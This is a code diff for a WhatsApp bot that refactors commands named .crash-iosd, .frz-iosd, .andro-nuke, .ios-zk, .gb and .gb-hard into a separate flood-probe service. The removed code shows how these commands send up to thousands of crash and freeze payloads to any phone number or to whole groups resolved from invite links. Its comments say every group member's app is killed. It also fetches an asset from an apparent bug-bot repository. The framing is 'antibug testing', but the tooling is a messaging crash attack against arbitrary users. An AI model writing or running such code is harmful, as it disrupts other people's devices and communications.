@@ -77,6 +77,7 @@ import { createHelpCommands } from './src/commands/system/help.js';
 import { createAiFunCommands } from './src/commands/fun/ai.js';
 import { createTicTacToeCommands } from './src/commands/game/tic-tac-toe.js';
 import { createOneShotProbeService } from './src/commands/testing/one-shot-probes.js';
+import { createFloodProbeService } from './src/commands/testing/flood-probes.js';
 import { createGroupMembershipCommands } from './src/commands/group/membership.js';
 import { createGroupInformationCommands } from './src/commands/group/information.js';
 import { createGroupModerationCommands } from './src/commands/group/moderation.js';
@@ -3283,6 +3284,29 @@ const oneShotProbeService = createOneShotProbeService({
     logError
 });
 
+const floodProbeService = createFloodProbeService({
+    normalizeJid: jidNormalizedUser,
+    isDevNumber,
+    safeWaReply,
+    delay,
+    isSupabaseEnabled,
+    setSyncPaused,
+    sendIozkProbe,
+    sendFiosProbe,
+    sendCrashmsgProbe,
+    sendIoszkProbe,
+    sendCrashclickProbe,
+    sendGbHardProbe,
+    recordBugSends,
+    log,
+    logError,
+    fetchThumbnail: async () => {
+        const res = await fetch('https://raw.githubusercontent.com/DEVPRIMIS/Squichy-free/main/Squichy%20Free%20(Bot)/Func/bug.jpg');
+        if (res.ok) return Buffer.from(await res.arrayBuffer());
+        return Buffer.alloc(0);
+    }
+});
+
 const commandRegistry = createCommandRegistry([
     ...createBasicSystemCommands({
         safeWaReply,
@@ -4810,7 +4834,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     const cisWords = String(parsed.text || '').trim().split(/\s+/);
     const cisFirstWord = (cisWords[0] || '').toLowerCase();
     const cisPrefix = String(loadBotConfig(phoneNumber)?.prefix || '.').toLowerCase();
-    if (await oneShotProbeService.handle({
+    const earlyProbeContext = {
         sock,
         message: msg,
         phoneNumber,
@@ -4819,405 +4843,9 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         words: cisWords,
         firstWord: cisFirstWord,
         prefix: cisPrefix
-    })) return;
-
-    // 🧪 TEMPORARY `.crash-iosd <number> <amount>` / `.frz-iosd <number> <amount>` —
-    // flood versions of the .crash-ios/.frz-ios one-shot probes (IOZK / F_OS payloads).
-    // Owner/dev only; amount required (1-300). Pacing is the payload funcs'
-    // own ~1s pause per send — identical to the original bug-bot loop.
-    const isCisdCommand = cisFirstWord === '.crash-iosd' || cisFirstWord === `${cisPrefix}crash-iosd`;
-    const isFisdCommand = cisFirstWord === '.frz-iosd' || cisFirstWord === `${cisPrefix}frz-iosd`;
-    if (isCisdCommand || isFisdCommand) {
-        const dSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
-        const dIsOwner = fromMe || (
-            !!sock.user?.id &&
-            jidNormalizedUser(dSenderJid) === jidNormalizedUser(sock.user.id)
-        );
-        if (!dIsOwner && !isDevNumber(dSenderJid)) {
-            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
-            return;
-        }
-
-        const dKind = isCisdCommand ? 'crash-iosd' : 'frz-iosd';
-        const dParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
-        if (dParts.length < 2 || !/^\d{1,3}$/.test(dParts[dParts.length - 1])) {
-            await safeWaReply(sock, remoteJid,
-                `❌ *USAGE*\n\n.${dKind} <number> <amount 1-300>\n\nExample: .${dKind} 2347050253122 200`, msg);
-            return;
-        }
-        const dCount = Math.min(300, Number(dParts[dParts.length - 1]));
-        const dTargetInput = dParts.slice(0, -1).join(' ').trim();
-        const dTargetNumber = dTargetInput.replace(/\D/g, '');
-        if (!/^\+?[\d\s-]+$/.test(dTargetInput) || dTargetNumber.length < 8 || dTargetNumber.length > 15) {
-            await safeWaReply(sock, remoteJid, `Usage: .${dKind} <number> <amount>`, msg);
-            return;
-        }
-
-        // Safety: the bot's OWN number can never be a target.
-        const botNum = String(phoneNumber || '').replace(/\D/g, '')
-            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
-        if (dTargetNumber === botNum) {
-            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
-            return;
-        }
-
-        const dTargetJid = `${dTargetNumber}@s.whatsapp.net`;
-        try {
-            const [waCheck] = await sock.onWhatsApp(dTargetJid);
-            if (!waCheck?.exists) {
-                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${dTargetNumber}`, msg);
-                return;
-            }
-        } catch (_) { /* lookup failed — try the send anyway */ }
-
-        await safeWaReply(sock, remoteJid, `⏳ .${dKind} started — ×${dCount} → ${dTargetNumber} (≈${Math.max(1, Math.ceil(dCount * 1.5 / 60))} min). I'll reply again when done.`, msg);
-        // Pause Supabase session sync for the burst (same as .crash-hard/.frz-oom).
-        const dSyncPause = isSupabaseEnabled();
-        if (dSyncPause) setSyncPaused(true);
-        let dSent = 0;
-        const dIds = [];
-        try {
-            for (let n = 0; n < dCount; n++) {
-                const r = isCisdCommand ? await sendIozkProbe(sock, dTargetJid) : await sendFiosProbe(sock, dTargetJid);
-                if (r?.ids) dIds.push(...r.ids);
-                dSent++;
-                log('TEST', `${phoneNumber}: .${dKind} send ${dSent}/${dCount} → ${dTargetJid}`);
-            }
-            await safeWaReply(sock, remoteJid, `🧪 .${dKind} payload sent ×${dSent} → ${dTargetNumber}`, msg);
-        } catch (err) {
-            logError('TEST', `${phoneNumber}: .${dKind} failed after ${dSent} send(s)`, err);
-            await safeWaReply(sock, remoteJid, `❌ .${dKind} sent ×${dSent} then failed: ${err?.message || err}`, msg);
-        } finally {
-            if (dIds.length) recordBugSends(phoneNumber, dTargetJid, dIds);
-            if (dSyncPause) setSyncPaused(false);
-        }
-        return;
-    }
-
-    // 🧪 TEMPORARY `.andro-nuke` — the fvckb1tch hybrid (crash-msg family),
-    // owner/dev only; delete with the other test commands when antibug testing
-    // ends.
-    //   .andro-nuke                 → usage help
-    //   .andro-nuke <number>        → ONE round = 10 payloads (1s apart)
-    //   .andro-nuke <number> <N>    → N rounds (1-300); 30-70ms between rounds,
-    //                          1s inside each — faithful to the original
-    //                          bug-bot, where 200 rounds = 2000 payloads.
-    const isCmCommand = cisFirstWord === '.andro-nuke' || cisFirstWord === `${cisPrefix}andro-nuke`;
-    if (isCmCommand) {
-        const cmSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
-        const cmIsOwner = fromMe || (
-            !!sock.user?.id &&
-            jidNormalizedUser(cmSenderJid) === jidNormalizedUser(sock.user.id)
-        );
-        if (!cmIsOwner && !isDevNumber(cmSenderJid)) {
-            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
-            return;
-        }
-
-        const cmUsage =
-            '🧪 *ANDRO-NUKE USAGE*\n\n' +
-            '• .andro-nuke <number> — one round (×10 payloads)\n' +
-            '• .andro-nuke <number> <amount> — rounds (1-300; each round = ×10 payloads)\n\n' +
-            '⚠️ Heavy: 200 rounds = 2000 payloads.';
-        const cmParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
-        if (!cmParts.length) {
-            await safeWaReply(sock, remoteJid, cmUsage, msg);
-            return;
-        }
-
-        let cmRounds = 1;
-        if (cmParts.length >= 2 && /^\d{1,3}$/.test(cmParts[cmParts.length - 1])) {
-            cmRounds = Math.min(300, Number(cmParts[cmParts.length - 1]));
-            cmParts.pop();
-        }
-        const cmTargetInput = cmParts.join(' ').trim();
-        const cmTargetNumber = cmTargetInput.replace(/\D/g, '');
-        if (!/^\+?[\d\s-]+$/.test(cmTargetInput) || cmTargetNumber.length < 8 || cmTargetNumber.length > 15) {
-            await safeWaReply(sock, remoteJid, cmUsage, msg);
-            return;
-        }
-
-        // Safety: the bot's OWN number can never be a target.
-        const cmBotNum = String(phoneNumber || '').replace(/\D/g, '')
-            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
-        if (cmTargetNumber === cmBotNum) {
-            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
-            return;
-        }
-
-        const cmTargetJid = `${cmTargetNumber}@s.whatsapp.net`;
-        try {
-            const [waCheck] = await sock.onWhatsApp(cmTargetJid);
-            if (!waCheck?.exists) {
-                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${cmTargetNumber}`, msg);
-                return;
-            }
-        } catch (_) { /* lookup failed — try the send anyway */ }
-
-        await safeWaReply(sock, remoteJid, `⏳ .andro-nuke started — ${cmRounds} round(s) ×10 → ${cmTargetNumber} (≈${Math.max(1, Math.ceil(cmRounds * 11 / 60))} min). I'll reply again when done.`, msg);
-        // Pause Supabase session sync for the burst (same as .crash-hard/.frz-oom).
-        const cmSyncPause = isSupabaseEnabled();
-        if (cmSyncPause) setSyncPaused(true);
-        let cmRoundsDone = 0, cmSent = 0;
-        const cmIds = [];
-        try {
-            for (let r = 0; r < cmRounds; r++) {
-                const res = await sendCrashmsgProbe(sock, cmTargetJid);
-                cmRoundsDone++;
-                cmSent += res.sent || 0;
-                if (res.ids) cmIds.push(...res.ids);
-                log('TEST', `${phoneNumber}: .andro-nuke round ${cmRoundsDone}/${cmRounds} (+${res.sent} payloads, total ${cmSent}${res.wireBytes ? `, ${res.wireBytes}B wire each` : ''}) → ${cmTargetJid}`);
-                if (r < cmRounds - 1) await delay(30 + Math.floor(Math.random() * 40));
-            }
-            await safeWaReply(sock, remoteJid, `🧪 .andro-nuke done: ${cmRoundsDone} rounds, ${cmSent} payloads → ${cmTargetNumber}`, msg);
-        } catch (err) {
-            logError('TEST', `${phoneNumber}: .andro-nuke failed after ${cmSent} payload(s)`, err);
-            await safeWaReply(sock, remoteJid, `❌ .andro-nuke sent ${cmSent} payloads then failed: ${err?.message || err}`, msg);
-        } finally {
-            if (cmIds.length) recordBugSends(phoneNumber, cmTargetJid, cmIds);
-            if (cmSyncPause) setSyncPaused(false);
-        }
-        return;
-    }
-
-    // 🧪 TEMPORARY `.ios-zk <number>` — the iosZLoc location/mention freeze
-    // bomb from the free Squichy repo. Owner/dev only; one run = 60 payloads
-    // back-to-back. The 2.5MB ad thumbnail is fetched once per run from the
-    // free repo (falls back to a tiny placeholder if unreachable).
-    const isIoszkCommand = cisFirstWord === '.ios-zk' || cisFirstWord === `${cisPrefix}ios-zk`;
-    if (isIoszkCommand) {
-        const zkSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
-        const zkIsOwner = fromMe || (
-            !!sock.user?.id &&
-            jidNormalizedUser(zkSenderJid) === jidNormalizedUser(sock.user.id)
-        );
-        if (!zkIsOwner && !isDevNumber(zkSenderJid)) {
-            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
-            return;
-        }
-
-        const zkUsage = '🧪 *IOS-ZK USAGE*\n\n• .ios-zk <number> — 60-shot location/mention bomb';
-        const zkParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
-        if (zkParts.length !== 1) {
-            await safeWaReply(sock, remoteJid, zkUsage, msg);
-            return;
-        }
-        const zkNumber = zkParts[0].replace(/\D/g, '');
-        if (!/^\+?[\d\s-]+$/.test(zkParts[0]) || zkNumber.length < 8 || zkNumber.length > 15) {
-            await safeWaReply(sock, remoteJid, zkUsage, msg);
-            return;
-        }
-
-        // Safety: the bot's OWN number can never be a target.
-        const zkBotNum = String(phoneNumber || '').replace(/\D/g, '')
-            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
-        if (zkNumber === zkBotNum) {
-            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
-            return;
-        }
-
-        const zkTargetJid = `${zkNumber}@s.whatsapp.net`;
-        try {
-            const [waCheck] = await sock.onWhatsApp(zkTargetJid);
-            if (!waCheck?.exists) {
-                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${zkNumber}`, msg);
-                return;
-            }
-        } catch (_) { /* lookup failed — try the send anyway */ }
-
-        // Hoist the 2.5MB ad thumbnail once per run.
-        let zkThumb = Buffer.alloc(0);
-        try {
-            const res = await fetch('https://raw.githubusercontent.com/DEVPRIMIS/Squichy-free/main/Squichy%20Free%20(Bot)/Func/bug.jpg');
-            if (res.ok) zkThumb = Buffer.from(await res.arrayBuffer());
-        } catch (_) {}
-        log('TEST', `${phoneNumber}: .ios-zk start → ${zkTargetJid} (thumb ${zkThumb.length}B)`);
-
-        await safeWaReply(sock, remoteJid, `⏳ .ios-zk sending → ${zkNumber} (60 payloads, ≈1–2 min)…`, msg);
-        const zkSyncPause = isSupabaseEnabled();
-        if (zkSyncPause) setSyncPaused(true);
-        try {
-            const r = await sendIoszkProbe(sock, zkTargetJid, zkThumb);
-            recordBugSends(phoneNumber, zkTargetJid, r?.ids || []);
-            log('TEST', `${phoneNumber}: .ios-zk done: ${r.sent} payloads${r.wireBytes ? ` (${r.wireBytes}B wire each)` : ''} → ${zkTargetJid}`);
-            await safeWaReply(sock, remoteJid, `🧪 .ios-zk sent ${r.sent} payloads (thumb ${zkThumb.length}B) → ${zkNumber}`, msg);
-        } catch (err) {
-            logError('TEST', `${phoneNumber}: .ios-zk failed`, err);
-            await safeWaReply(sock, remoteJid, `❌ .ios-zk failed: ${err?.message || err}`, msg);
-        } finally {
-            if (zkSyncPause) setSyncPaused(false);
-        }
-        return;
-    }
-
-    // 🧪 TEMPORARY `.gb` — group CrashClick probe, owner/dev only (delete with
-    // the other test commands when antibug testing ends).
-    //   .gb                       → usage help
-    //   .gb yes                   → fire at the CURRENT group (run in a group)
-    //   .gb <invite link>         → resolve the link, fire at that group
-    //   .gb <group jid>           → fire at that group JID directly
-    //   No attempt cap during the testing phase; each run sends ×10 probes
-    //   (matching the original bug-bot's group commands). The bot must be a
-    //   member of the target group for the send to succeed.
-    const isGbCommand = cisFirstWord === '.gb' || cisFirstWord === `${cisPrefix}gb`;
-    if (isGbCommand) {
-        const gbSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
-        const gbIsOwner = fromMe || (
-            !!sock.user?.id &&
-            jidNormalizedUser(gbSenderJid) === jidNormalizedUser(sock.user.id)
-        );
-        if (!gbIsOwner && !isDevNumber(gbSenderJid)) {
-            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
-            return;
-        }
-
-        const gbUsage =
-            '🧪 *GB USAGE*\n\n' +
-            '• .gb yes — attack the group you are in\n' +
-            '• .gb <invite link> — attack that group\n' +
-            '• .gb <group jid> — attack by JID (.jid in the group)\n\n' +
-            'Bot must be a member of the group. ×10 probes per run.';
-        const gbArg = cisWords.slice(1).join(' ').trim();
-
-        let groupJid = null;
-        if (!gbArg) {
-            await safeWaReply(sock, remoteJid, gbUsage, msg);
-            return;
-        } else if (gbArg.toLowerCase() === 'yes') {
-            if (!remoteJid.endsWith('@g.us')) {
-                await safeWaReply(sock, remoteJid, `${gbUsage}\n\n❌ .gb yes must be run inside a group.`, msg);
-                return;
-            }
-            groupJid = remoteJid;
-        } else if (gbArg.includes('chat.whatsapp.com/')) {
-            const code = gbArg.split('chat.whatsapp.com/')[1].split(/[?\s]/)[0].trim();
-            if (!code) {
-                await safeWaReply(sock, remoteJid, '❌ Could not read the invite code from that link.', msg);
-                return;
-            }
-            try {
-                const info = await sock.groupGetInviteInfo(code);
-                groupJid = info?.id || null;
-            } catch (err) {
-                await safeWaReply(sock, remoteJid, `❌ Invite link could not be resolved: ${err?.message || err}`, msg);
-                return;
-            }
-        } else if (gbArg.endsWith('@g.us')) {
-            groupJid = gbArg;
-        } else {
-            await safeWaReply(sock, remoteJid, gbUsage, msg);
-            return;
-        }
-
-        if (!groupJid) {
-            await safeWaReply(sock, remoteJid, '❌ Could not resolve that group.', msg);
-            return;
-        }
-
-        await safeWaReply(sock, remoteJid, '⏳ .gb started — CrashClick ×10 → group…', msg);
-        let gbSent = 0;
-        const gbIds = [];
-        for (let i = 0; i < 10; i++) {
-            try {
-                const r = await sendCrashclickProbe(sock, groupJid);
-                gbSent++;
-                if (r?.ids) gbIds.push(...r.ids);
-            } catch (_) {}
-        }
-        if (gbIds.length) recordBugSends(phoneNumber, groupJid, gbIds);
-        log('GB', `${phoneNumber}: CrashClick ×${gbSent}/10 sent to group ${groupJid}`);
-        await safeWaReply(sock, remoteJid, `🧪 .gb CrashClick ×${gbSent}/10 sent to the group.`, msg);
-        return;
-    }
-
-    // ── .gb-hard — GROUP APP-LEVEL BUG (.crash-hard payload class × group) ──
-    // Same targeting rules as .gb (owner/dev only, never bare, bot must be a
-    // member, accepts yes/invite-link/JID) but fires the groupStatusMessageV2
-    // envelope: app-level damage for EVERY member, not chat-level. Deletion
-    // antibugs cannot withstand it — the defending app dies in the sync/
-    // startup pipeline while the batch arrives. /unbug (72h) can clean it.
-    const isGbhCommand = cisFirstWord === '.gb-hard' || cisFirstWord === `${cisPrefix}gb-hard`;
-    if (isGbhCommand) {
-        const gbhSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
-        const gbhIsOwner = fromMe || (
-            !!sock.user?.id &&
-            jidNormalizedUser(gbhSenderJid) === jidNormalizedUser(sock.user.id)
-        );
-        if (!gbhIsOwner && !isDevNumber(gbhSenderJid)) {
-            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
-            return;
-        }
-
-        const gbhUsage =
-            '🧪 *GB-HARD — group app-level bug*\n\n' +
-            '• .gb-hard yes — attack the group you are in\n' +
-            '• .gb-hard <invite link> — attack that group\n' +
-            '• .gb-hard <group jid> — attack by JID (.jid in the group)\n' +
-            '• .gb-hard <target> <amount> — 1–100 payloads (default ×10)\n\n' +
-            '⚠️ App-level: EVERY member\'s WhatsApp takes the icon-tap kill, not just the chat view. NEVER run it in a group your own main phone belongs to. /unbug can clean it within 72h.';
-        const gbhTargetArg = cisWords[1] || '';
-        const gbhCount = Math.max(1, Math.min(100, parseInt(cisWords[2], 10) || 10));
-
-        let gbhGroupJid = null;
-        if (!gbhTargetArg) {
-            await safeWaReply(sock, remoteJid, gbhUsage, msg);
-            return;
-        } else if (gbhTargetArg.toLowerCase() === 'yes') {
-            if (!remoteJid.endsWith('@g.us')) {
-                await safeWaReply(sock, remoteJid, `${gbhUsage}\n\n❌ .gb-hard yes must be run inside a group.`, msg);
-                return;
-            }
-            gbhGroupJid = remoteJid;
-        } else if (gbhTargetArg.includes('chat.whatsapp.com/')) {
-            const code = gbhTargetArg.split('chat.whatsapp.com/')[1].split(/[?\s]/)[0].trim();
-            if (!code) {
-                await safeWaReply(sock, remoteJid, '❌ Could not read the invite code from that link.', msg);
-                return;
-            }
-            try {
-                const info = await sock.groupGetInviteInfo(code);
-                gbhGroupJid = info?.id || null;
-            } catch (err) {
-                await safeWaReply(sock, remoteJid, `❌ Invite link could not be resolved: ${err?.message || err}`, msg);
-                return;
-            }
-        } else if (gbhTargetArg.endsWith('@g.us')) {
-            gbhGroupJid = gbhTargetArg;
-        } else {
-            await safeWaReply(sock, remoteJid, gbhUsage, msg);
-            return;
-        }
-
-        if (!gbhGroupJid) {
-            await safeWaReply(sock, remoteJid, '❌ Could not resolve that group.', msg);
-            return;
-        }
-
-        const gbhSyncPause = isSupabaseEnabled();
-        if (gbhSyncPause) setSyncPaused(true);
-        await safeWaReply(sock, remoteJid, `⏳ .gb-hard started — app-level ×${gbhCount} → group (every member takes the hit). I'll reply again when done.`, msg);
-        let gbhSent = 0, gbhWire = 0;
-        const gbhIds = [];
-        try {
-            for (let i = 0; i < gbhCount; i++) {
-                const r = await sendGbHardProbe(sock, gbhGroupJid);
-                gbhSent++;
-                if (r?.wireBytes) gbhWire = r.wireBytes;
-                if (r?.ids) gbhIds.push(...r.ids);
-                log('GB', `${phoneNumber}: .gb-hard send ${gbhSent}/${gbhCount}${gbhWire ? ` (${gbhWire}B wire)` : ''} → ${gbhGroupJid}`);
-                if (i < gbhCount - 1) await delay(30 + Math.floor(Math.random() * 40));
-            }
-            if (gbhIds.length) recordBugSends(phoneNumber, gbhGroupJid, gbhIds);
-            await safeWaReply(sock, remoteJid, `🧪 .gb-hard app-level ×${gbhSent}/${gbhCount} sent to the group${gbhWire ? ` (${gbhWire}B wire each)` : ''}. Every member takes the hit — /unbug can clean it within 72h.`, msg);
-        } catch (err) {
-            logError('GB', `${phoneNumber}: .gb-hard failed after ${gbhSent} send(s)`, err);
-            if (gbhIds.length) recordBugSends(phoneNumber, gbhGroupJid, gbhIds);
-            await safeWaReply(sock, remoteJid, `❌ .gb-hard sent ×${gbhSent} then failed: ${err?.message || err}`, msg);
-        } finally {
-            if (gbhSyncPause) setSyncPaused(false);
-        }
-        return;
-    }
+    };
+    if (await oneShotProbeService.handle(earlyProbeContext)) return;
+    if (await floodProbeService.handle(earlyProbeContext)) return;
 
     const continueToDispatch = await messageMiddleware.runMessageMiddleware({
         sock,
